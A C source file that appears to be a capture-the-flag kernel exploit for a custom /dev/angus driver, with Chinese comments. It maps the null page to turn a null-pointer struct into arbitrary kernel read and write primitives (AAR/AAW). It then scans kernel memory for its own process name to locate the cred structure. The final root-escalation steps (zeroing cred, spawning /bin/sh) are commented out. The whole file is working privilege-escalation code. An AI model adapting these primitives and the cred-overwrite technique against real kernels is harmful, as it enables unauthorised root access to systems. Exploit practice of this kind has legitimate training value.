#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>

#define CMD_INIT 0x13370001
#define CMD_SETKEY 0x13370002
#define CMD_SETDATA 0x13370003
#define CMD_GETDATA 0x13370004
#define CMD_ENCRYPT 0x13370005
#define CMD_DECRYPT 0x13370006

typedef struct {
  char *key;
  char *data;
  size_t keylen;
  size_t datalen;
} XorCipher;

typedef struct {
  char *ptr;
  size_t len;
} request_t;

XorCipher *nullptr = NULL;

int fd = 0;

int angus_getdata(char *data, size_t datalen) {
  request_t req = {.ptr = data, .len = datalen};
  return ioctl(fd, CMD_GETDATA, &req);
}

int angus_encrypt() {
  request_t req = {NULL};
  return ioctl(fd, CMD_ENCRYPT, &req);
}
int angus_decrypt() {
  request_t req = {NULL};
  return ioctl(fd, CMD_ENCRYPT, &req);
}

void AAR(char *dst, char *src, size_t len) {
  nullptr->data = src;
  nullptr->datalen = len;
  angus_getdata(dst, len);
}

void AAW(char *dst, char *src, size_t len) {
  // 由于驱动中对于数据的存储需要经过一个异或的操作，所以我们需要利用异或的自反性处理一下数据后传入
  char *tmp = (char *)malloc(len);
  if (tmp == NULL)
    perror("tmp alloc fail!");
  AAR(tmp, dst, len); // 将 dst 中的数据读到 tmp 中

  for (int i = 0; i < len; i++) {
    tmp[i] ^= src[i];
    // 将要写入dst中的数据与原本dst中数据进行异或（利用异或的自反性）
    // tmp(dst) ^ src ^ dst =src
  }

  nullptr->data = dst;
  nullptr->datalen = len;
  nullptr->key = tmp;
  nullptr->keylen = len;

  angus_encrypt();
}

void cred_struct_attack() {
  prctl(PR_SET_NAME, "young"); // 设置本进程名为young

  char *leak = (char *)malloc(0x1000000);
  uint64_t addr = 0;
  uint64_t *cred = 0;

  for (addr = 0xffff888000000000; addr < 0xffffc88000000000;
       addr += 0x1000000) {
    if (addr % 0x1000000000 == 0) {
      printf("[*] research addr: 0x%lx\n", addr);
    }

    char *needle = NULL;
    AAR(leak, (char *)addr, 0x1000000);
    needle = memmem((unsigned char *)leak, 0x1000000, "young", 5);
    if (needle != NULL) {
      printf("[*] the comm found at offset: 0x%lx\n", needle - leak);
      addr += (needle - leak);
      cred = (uint64_t *)(addr - 0x8);
      printf("[*] the cred struct addr is: 0x%lx\n", (unsigned long)cred);
      break;
    }
  }

  if (addr == 0xffffc88000000000) {
    puts("[-] Not found");
    exit(1);
  }

  //   char zero[0x20] = {0};

  //   AAW((char *)cred, zero, sizeof(zero));

  //   puts("[+] Win!");
  //   system("/bin/sh");
}

int main() {
  fd = open("/dev/angus", O_RDWR);

  if (mmap(0, 0x1000, PROT_READ | PROT_WRITE,
           MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1,
           0) != NULL) // 在地址0处映射一块内存
  {
    perror("mmap failed");
  }

  cred_struct_attack();

  close(fd);

  return 0;
}